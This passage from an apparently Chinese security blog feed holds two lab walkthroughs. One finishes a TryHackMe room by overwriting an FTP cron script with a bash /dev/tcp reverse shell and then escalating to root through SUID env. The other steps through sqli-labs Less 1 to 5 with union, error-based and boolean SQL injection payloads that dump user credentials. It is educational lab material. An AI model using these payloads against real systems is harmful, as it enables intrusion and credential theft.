class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get clean.sh</span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for clean.sh (314 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">314 bytes received in 0.00 secs (3.4820 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get removed_files.log</span></span><br><span class="line">local: removed_files.log remote: removed_files.log</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for removed_files.log (989 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">989 bytes received in 0.57 secs (1.6842 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get to_do.txt</span></span><br><span class="line">local: to_do.txt remote: to_do.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for to_do.txt (68 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 0.60 secs (0.1115 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-查看文件"><a href="#0x04-查看文件" class="headerlink" title="0x04.查看文件"></a>0x04.查看文件</h2><p><code>发现clean.sh作用为删除/tmp下的文件，另外两个文件没有什么有用的东西</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x05-反弹shell"><a href="#0x05-反弹shell" class="headerlink" title="0x05.反弹shell"></a>0x05.反弹shell</h2><p><code>修改clean.sh并上传，文件内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.9.248.83/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0Lw==">shell利用<i class="fa fa-external-link-alt"></i></span></p><p><code>对服务器文件进行覆盖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put clean.sh clean.sh </span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">54 bytes sent in 0.00 secs (1.0098 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>kali监听端口，使用rlwrap就可以使用键盘上下箭头了</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# rlwrap nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.9.248.83] from (UNKNOWN) [10.10.136.156] 49676</span><br><span class="line">bash: cannot set terminal process group (1144): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">namelessone</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">****************************</span><br></pre></td></tr></table></figure><h2 id="0x06-提权"><a href="#0x06-提权" class="headerlink" title="0x06.提权"></a>0x06.提权</h2><p><code>使用SUID提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/nul</span><br><span class="line">或者</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZW52Lw==">env提权参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">pwd</span><br><span class="line">/home/namelessone</span><br><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page1(basic)</title>
    <link href="https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/"/>
    <id>https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/</id>
    <published>2021-01-10T05:39:49.000Z</published>
    <updated>2021-01-16T08:13:59.848Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page1(basic)</strong></p><a id="more"></a><h2 id="0x01-Less-1-GET-基于报错-单引号"><a href="#0x01-Less-1-GET-基于报错-单引号" class="headerlink" title="0x01.Less-1 GET 基于报错 单引号"></a>0x01.Less-1 GET 基于报错 单引号</h2><p><code>正常访问</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230221905854.png" class><p><code>测试报错</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222040571.png" class><p><code>探测字段数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><p><code>到4回显，结果为3列</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222525420.png" class><p><code>union注入，id需为一个不存在的数，进行爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,database(),user() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230223306403.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><blockquote><p>select table_name from information_schema.tables where table_schema=’security’ limit 0,1;为查询security数据库的第一张表</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225728017.png" class><p><code>依次类推，查询第二、三、四张~</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225821260.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230132459.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230220235.png" class><p><code>对emails表爆字段，下面为第一个字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232717251.png" class><p><code>第二个字段与第三个字段如下，第三个字段为空</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 2,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232456670.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232741394.png" class><p><code>知道了字段名与表名就可以读取数据了，读取到了本不该让用户读取到的内容</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230233414685.png" class><h2 id="0x02-Less-2-GET-基于报错-基于整型"><a href="#0x02-Less-2-GET-基于报错-基于整型" class="headerlink" title="0x02.Less-2 GET 基于报错 基于整型"></a>0x02.Less-2 GET 基于报错 基于整型</h2><p><code>同Less1，只需将单引号去掉即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-2/?id=0 union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x03-Less-3-GET-基于报错-单引号-括号"><a href="#0x03-Less-3-GET-基于报错-单引号-括号" class="headerlink" title="0x03.Less-3 GET 基于报错 单引号+括号"></a>0x03.Less-3 GET 基于报错 单引号+括号</h2><p><code>同Less1，加一个括号，这是一个变形题</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-3/?id=0&#x27;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x04-Less-4-GET-基于报错-双引号-括号"><a href="#0x04-Less-4-GET-基于报错-双引号-括号" class="headerlink" title="0x04.Less-4 GET 基于报错 双引号+括号"></a>0x04.Less-4 GET 基于报错 双引号+括号</h2><p><code>同Less3，只需将单引号换为双引号即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-4/?id=0&quot;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x05-Less-5-GET-双注入-单引号"><a href="#0x05-Less-5-GET-双注入-单引号" class="headerlink" title="0x05.Less-5 GET 双注入 单引号"></a>0x05.Less-5 GET 双注入 单引号</h2><p><code>测试发现正常?id=1有回显，加上单引号会出现报错</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174115897.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174144932.png" class><p><code>接着测试发现当条件为假时没有回显，存在bool注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174447919.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174515636.png" class><p><code>接着测试发现存在时间延时</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and sleep(5) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231175223651.png" class><h3 id="1-第一种方法-利用报错注入"><a href="#1-第一种方法-利用报错注入" class="headerlink" title="1.第一种方法(利用报错注入)"></a>1.第一种方法(利用报错注入)</h3><p><strong>先来理解几个函数</strong></p><p><code>concat聚合函数</code></p><blockquote><p>简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。</p><p>比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><p>如下例：数据库版本为5.5.530</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231192403062.png" class><p><code>rand()函数</code></p><blockquote><p>rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列，每次生成的随机数都是一样的。如下图</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231190859205.png" class><p><code>floor()函数</code></p><blockquote><p>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。floor(rand(0)*2)输出如下。</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231191348407.png" class><p><code>group by</code></p><blockquote><p>group by 主要用来对数据进行分组（相同的分为一组，相同名字会合并）</p></blockquote><p><code>count(*)</code></p><blockquote><p>count(*)用于统计数据出现的次数</p></blockquote><p><strong>探测列数，结果为3列</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231200902624.png" class><p><strong>爆库</strong></p><blockquote><p>报错时才会回显</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIzNTQ5Ni5odG1s">键值报错原理参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201157161.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201226057.png" class><p><strong>爆表</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">将table_schema=database()换为table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231204516748.png" class><p><strong>爆users表列名</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205019454.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205043144.png" class><p><strong>爆字段</strong></p><blockquote><p>concat_ws用于指定符号拼接，本次使用-拼接</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 0,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 1,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 3,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231210556609.png" class><p><code>另一种报错方式</code></p><blockquote><p>使用updatexml函数，updatexml(XML_document, XPath_string, new_value);</p></blockquote><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>XML_document</td><td>String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>Xpath格式的字符串</td></tr><tr><td>new_value</td><td>String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>payload如下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select ***()),0x7e),1</span><br></pre></td></tr></table></figure><p><strong>原理</strong></p><blockquote><p><code>concat()</code>函数是将其连成一个字符串，因此不会符合<strong>XPATH_string</strong>的格式，从而出现格式错误</p></blockquote><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102233937461.png" class><p><code>简单的方法</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234125500.png" class><p><code>用户版本等</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234201499.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234230939.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234706750.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234733739.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 2,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235422105.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235434612.png" class><p><code>爆数据</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235643837.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235701283.png" class><h3 id="2-第二种方法-利用bool注入"><a href="#2-第二种方法-利用bool注入" class="headerlink" title="2.第二种方法(利用bool注入)"></a>2.第二种方法(利用bool注入)</h3><p><code>在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101182907330.png" class><blockquote><p>此种注入可以使用bp的intruder模块进行爆破，如下图。由于mysql不区分大小写，所以字典为a-z、0-9，特殊的加上特殊字符即可。</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190352877.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190421957.png" class><p><code>依次类推，进行爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure><img 